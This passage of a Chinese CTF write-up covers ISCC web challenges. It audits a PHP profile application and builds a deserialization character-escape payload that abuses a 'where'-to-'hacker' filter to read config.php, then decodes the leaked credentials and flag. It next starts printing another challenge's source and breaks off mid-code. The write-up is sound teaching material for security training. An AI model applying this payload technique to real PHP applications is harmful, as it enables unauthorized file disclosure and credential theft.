class="hljs-variable">$escape</span>, <span class="hljs-string">&#x27;_&#x27;</span>, <span class="hljs-variable">$string</span>);<br><br><span class="hljs-variable">$safe</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;select&#x27;</span>, <span class="hljs-string">&#x27;insert&#x27;</span>, <span class="hljs-string">&#x27;update&#x27;</span>, <span class="hljs-string">&#x27;delete&#x27;</span>, <span class="hljs-string">&#x27;where&#x27;</span>);<br><span class="hljs-variable">$safe</span> = <span class="hljs-string">&#x27;/&#x27;</span> . implode(<span class="hljs-string">&#x27;|&#x27;</span>, <span class="hljs-variable">$safe</span>) . <span class="hljs-string">&#x27;/i&#x27;</span>;<br><span class="hljs-keyword">return</span> preg_replace(<span class="hljs-variable">$safe</span>, <span class="hljs-string">&#x27;hacker&#x27;</span>, <span class="hljs-variable">$string</span>);<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>) </span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-keyword">__class__</span>;<br>&#125;<br>&#125;<br>session_start();<br><span class="hljs-variable">$user</span> = <span class="hljs-keyword">new</span> user();<br><span class="hljs-variable">$user</span>-&gt;connect(<span class="hljs-variable">$config</span>);<br><br></code></pre></td></tr></table></figure><p> register.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;class.php&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>] &amp;&amp; <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]) &#123;<br><span class="hljs-variable">$username</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$password</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(strlen(<span class="hljs-variable">$username</span>) &lt; <span class="hljs-number">3</span> <span class="hljs-keyword">or</span> strlen(<span class="hljs-variable">$username</span>) &gt; <span class="hljs-number">16</span>) <br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Invalid user name&#x27;</span>);<br><br><span class="hljs-keyword">if</span>(strlen(<span class="hljs-variable">$password</span>) &lt; <span class="hljs-number">3</span> <span class="hljs-keyword">or</span> strlen(<span class="hljs-variable">$password</span>) &gt; <span class="hljs-number">16</span>) <br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Invalid password&#x27;</span>);<br><span class="hljs-keyword">if</span>(!<span class="hljs-variable">$user</span>-&gt;is_exists(<span class="hljs-variable">$username</span>)) &#123;<br><span class="hljs-variable">$user</span>-&gt;register(<span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Register OK!&lt;a href=&quot;index.php&quot;&gt;Please Login&lt;/a&gt;&#x27;</span>;<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;User name Already Exists&#x27;</span>);<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>profile.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;class.php&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>] == <span class="hljs-literal">null</span>) &#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Login First&#x27;</span>);<br>&#125;<br><span class="hljs-variable">$username</span> = <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$profile</span>=<span class="hljs-variable">$user</span>-&gt;show_profile(<span class="hljs-variable">$username</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$profile</span>  == <span class="hljs-literal">null</span>) &#123;<br>header(<span class="hljs-string">&#x27;Location: update.php&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-variable">$profile</span> = unserialize(<span class="hljs-variable">$profile</span>);<br><span class="hljs-variable">$phone</span> = <span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;phone&#x27;</span>];<br><span class="hljs-variable">$email</span> = <span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;email&#x27;</span>];<br><span class="hljs-variable">$nickname</span> = <span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>];<br><span class="hljs-variable">$photo</span> = base64_encode(file_get_contents(<span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;photo&#x27;</span>]));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>update.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;class.php&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>] == <span class="hljs-literal">null</span>) &#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Login First&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;phone&#x27;</span>] &amp;&amp; <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;email&#x27;</span>] &amp;&amp; <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>] &amp;&amp; <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;photo&#x27;</span>]) &#123;<br><br><span class="hljs-variable">$username</span> = <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&#x27;/^\d&#123;11&#125;$/&#x27;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;phone&#x27;</span>]))<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Invalid phone&#x27;</span>);<br><br><span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&#x27;/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/&#x27;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;email&#x27;</span>]))<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Invalid email&#x27;</span>);<br><br><span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/[^a-zA-Z0-9_]/&#x27;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>]) || strlen(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>]) &gt; <span class="hljs-number">10</span>)<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Invalid nickname&#x27;</span>);<br><br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;photo&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;size&#x27;</span>] &lt; <span class="hljs-number">5</span> <span class="hljs-keyword">or</span> <span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;size&#x27;</span>] &gt; <span class="hljs-number">1000000</span>)<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Photo size error&#x27;</span>);<br><br>move_uploaded_file(<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;tmp_name&#x27;</span>], <span class="hljs-string">&#x27;upload/&#x27;</span> . md5(<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;name&#x27;</span>]));<br><span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;phone&#x27;</span>] = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;phone&#x27;</span>];<br><span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;email&#x27;</span>] = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;email&#x27;</span>];<br><span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>] = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>];<br><span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;photo&#x27;</span>] = <span class="hljs-string">&#x27;upload/&#x27;</span> . md5(<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;name&#x27;</span>]);<br><br><span class="hljs-variable">$user</span>-&gt;update_profile(<span class="hljs-variable">$username</span>, serialize(<span class="hljs-variable">$profile</span>));<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Update Profile Success!&lt;a href=&quot;profile.php&quot;&gt;Your Profile&lt;/a&gt;&#x27;</span>;<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><strong>1.审计代码</strong></p><ul><li><p>config.php<br>flag在这里</p></li><li><p>register.php<br>注册账号，对帐号密码长度做出限制</p></li><li><p>profile.php<br>（1）将序列化后的用户信息进行了反序列化，且读取了上传的 photo 文件内容<br>（2）用base64编码对上传文件进行了读取和显示</p></li><li><p>update.php<br>（1）phone 长度为11位；<br>（2）nickname长度小于 10 位，且只能为字母和数字；<br>（3）将用户填写的 phone、email、nickname 以及上传的文件进行序列化</p></li><li><p>class.php<br>存在参数过滤，filter 中将 ‘select’, ‘insert’, ‘update’, ‘delete’, ‘where’ 等词用 ‘hacker’ 替换掉.</p></li></ul><p>存在参数过滤，where被替换成hacker，长度加1</p><p><strong>2.序列化profile</strong><br>update.php中POST提交完后对$profile进行序列化操作</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$profile</span> = <span class="hljs-keyword">array</span>();<br><span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;phone&#x27;</span>] = <span class="hljs-string">&#x27;18288669977&#x27;</span>;<br><span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;email&#x27;</span>] = <span class="hljs-string">&#x27;2233445588@qq.com&#x27;</span>;<br><span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>] = <span class="hljs-string">&#x27;xiaom&#x27;</span>;<br><span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;photo&#x27;</span>] = <span class="hljs-string">&#x27;config.php&#x27;</span>;<br><br><span class="hljs-keyword">echo</span> serialize(<span class="hljs-variable">$profile</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>结果为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">a:<span class="hljs-number">4</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;phone&quot;</span>;s:<span class="hljs-number">11</span>:<span class="hljs-string">&quot;18288669977&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;email&quot;</span>;s:<span class="hljs-number">17</span>:<span class="hljs-string">&quot;2233445588@qq.com&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;nickname&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;xiaom&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;photo&quot;</span>;s:<span class="hljs-number">10</span>:<span class="hljs-string">&quot;config.php&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>下面可以利用php反序列化字符逃逸</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">PHP在反序列化时，从左往右读取数据类型及长度，且只读取其中规定长度的数据，即当数据的长度大于规定的长度，后面还有数据也不再读取，而后面不再读取的数据，就会被挤到下一个数据项中。<br></code></pre></td></tr></table></figure><p><strong>3.反序列化字符逃逸</strong><br>这里需要构造超出长度的数据，将被挤出来的数据形成可以读取config.php 的数据项</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-string">&quot;;&#125;s:5:&quot;</span>photo<span class="hljs-string">&quot;;s:10:&quot;</span>config.php<span class="hljs-string">&quot;;&#125;</span><br></code></pre></td></tr></table></figure><p>上面的字符串一共34个字符，所以需要在 nickname 处多添加34位长的数据，才能将这段数据挤到 photo 的位置上去。</p><p>class.php代码中存在过滤， <code>where</code> 被替换成了 <code>hacker</code>，此时字符串的长度加 1 ，如果在 nickname 处填进 34 个<code>where</code>，就会被替换成 34 个 <code>hacker</code>，即nickname 的长度超出了 34 位。</p><p>得到payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere<span class="hljs-string">&quot;;&#125;s:5:&quot;</span>photo<span class="hljs-string">&quot;;s:10:&quot;</span>config.php<span class="hljs-string">&quot;;&#125;</span><br></code></pre></td></tr></table></figure><p>访问register.php，注册账号，然后登陆,在Nickname处填入上面的payload</p><p><img src="https://img-blog.csdnimg.cn/20210504125229650.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>抓包，将Nickname修改为Nickname[]数组类型<br><img src="https://img-blog.csdnimg.cn/20210504125326751.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>4.利用base64编码读取flag</strong><br>放包，点击超链接跳转到profile.php页面，查看源码<br><img src="https://img-blog.csdnimg.cn/20210504125526632.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>一段Base编码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">PD9waHAKJGNvbmZpZ1snaG9zdG5hbWUnXSA9ICcxMjcuMC4wLjEnOwokY29uZmlnWyd1c2VybmFtZSddID0gJ3Jvb3QnOwokY29uZmlnWydwYXNzd29yZCddID0gJ3F3ZXJ0eXVpb3AnOwokY29uZmlnWydkYXRhYmFzZSddID0gJ2NoYWxsZW5nZXMnOwokZmxhZyA9ICdJU0NDe3doYXRfaXNAdGhlJl9uaWNrbmFtZSo/MTExMjIzNH0nOwo/Pgo=<br></code></pre></td></tr></table></figure><p>Base64解码得到flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;?php<br><span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;hostname&#x27;</span>] = <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>;<br><span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;username&#x27;</span>] = <span class="hljs-string">&#x27;root&#x27;</span>;<br><span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;password&#x27;</span>] = <span class="hljs-string">&#x27;qwertyuiop&#x27;</span>;<br><span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;database&#x27;</span>] = <span class="hljs-string">&#x27;challenges&#x27;</span>;<br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&#x27;ISCC&#123;what_is@the&amp;_nickname*?1112234&#125;&#x27;</span>;<br>?&gt;<br></code></pre></td></tr></table></figure><h2 id="which-is-the-true-iscc"><a href="#which-is-the-true-iscc" class="headerlink" title="which is the true iscc"></a>which is the true iscc</h2><blockquote><p>小夏同学很想知道ISCC到底是什么，不过上网后的搜索让他更加迷惑了——怎么有这么多ISCC？？到底哪个ISCC是真的呢？你能帮他找到真正的ISCC吗？<br>题目入口：<a href="http://39.96.91.106:7050/">http://39.96.91.106:7050</a></p></blockquote><p>访问题目地址,查看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;!--<br>&lt;a href=<span class="hljs-string">&quot;/?whatareyounongshane=src&quot;</span>&gt;我真的是源码?&lt;/a&gt;<br>&lt;a href=<span class="hljs-string">&quot;/?whatareyounongshane=cmd&quot;</span>&gt;干点好事!&lt;/a&gt;<br>&lt;a href=<span class="hljs-string">&quot;/?whatareyounongshane=upload&quot;</span>&gt;送点东西!&lt;/a&gt;<br>&lt;a href=<span class="hljs-string">&quot;/?whatareyounongshane=tellmetruth&quot;</span>&gt;快告诉我真相!&lt;/a&gt;<br>--&gt;<br></code></pre></td></tr></table></figure><p>按照提示，访问/?whatareyounongshane=src，得到源码:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br>session_start();<br>ini_set(<span class="hljs-string">&#x27;max_execution_time&#x27;</span>, <span class="hljs-string">&#x27;5&#x27;</span>);<br>set_time_limit(<span class="hljs-number">5</span>);<br><br><span class="hljs-variable">$status</span> = <span class="hljs-string">&quot;new&quot;</span>;<br><span class="hljs-variable">$cmd</span> = <span class="hljs-string">&quot;whoami&quot;</span>;<br><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$is_unser_finished</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$iscc_file</span> = <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ISCC_Upload</span> </span>&#123;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$cmd</span>;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$is_upload</span>;<br>        <span class="hljs-variable">$cmd</span> = <span class="hljs-string">&quot;whoami&quot;</span>;<br>        <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;name&#x27;</span>] = randstr(<span class="hljs-number">14</span>);<br>        <span class="hljs-variable">$is_upload</span> = (count(<span class="hljs-variable">$_FILES</span>) &gt; <span class="hljs-number">0</span>);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$is_upload</span>;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$status</span>;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$iscc_file</span>;<br>        <span class="hljs-variable">$status</span> = <span class="hljs-string">&quot;upload_fail&quot;</span>;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$is_upload</span>) &#123;<br><br>            <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_FILES</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>)<br>                <span class="hljs-variable">$GLOBALS</span>[<span class="hljs-variable">$key</span>] = <span class="hljs-variable">$value</span>;<br><br><br>            <span class="hljs-keyword">if</span>(is_uploaded_file(<span class="hljs-variable">$iscc_file</span>[<span class="hljs-string">&#x27;tmp_name&#x27;</span>])) &#123;<br><br>                <span class="hljs-variable">$check</span> = @getimagesize(<span class="hljs-variable">$iscc_file</span>[<span class="hljs-string">&quot;tmp_name&quot;</span>]);<br><br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$check</span> !== <span class="hljs-literal">false</span>) &#123;<br><br>                    <span class="hljs-variable">$target_dir</span> = <span class="hljs-string">&quot;/var/tmp/&quot;</span>;<br>                    <span class="hljs-variable">$target_file</span> = <span class="hljs-variable">$target_dir</span> . randstr(<span class="hljs-number">10</span>);<br><br>                    <span class="hljs-keyword">if</span> (file_exists(<span class="hljs-variable">$target_file</span>)) &#123;<br>                        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;想啥呢？有东西了……&lt;br&gt;&quot;</span>;<br>                        finalize();<br>                        <span class="hljs-keyword">exit</span>;<br>                    &#125;<br><br>                    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$iscc_file</span>[<span class="hljs-string">&quot;size&quot;</span>] &gt; <span class="hljs-number">500000</span>) &#123;<br>                        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;东西塞不进去~&lt;br&gt;&quot;</span>;<br>                        finalize();<br>                        <span class="hljs-keyword">exit</span>;<br>                    &#125;<br><br>                    <span class="hljs-keyword">if</span> (move_uploaded_file(<span class="hljs-variable">$iscc_file</span>[<span class="hljs-string">&quot;tmp_name&quot;</span>], <span class="hljs-variable">$target_file</span>)) &#123;<br>                        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;我拿到了！&lt;br&gt;&quot;</span>;<br>                        <span class="hljs-variable">$iscc_file</span> = <span class="hljs-variable">$target_file</span>;<br>                        <span class="hljs-variable">$status</span> = <span class="hljs-string">&quot;upload_ok&quot;</span>;<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        <span class="hljs-keyword">echo</span> <span 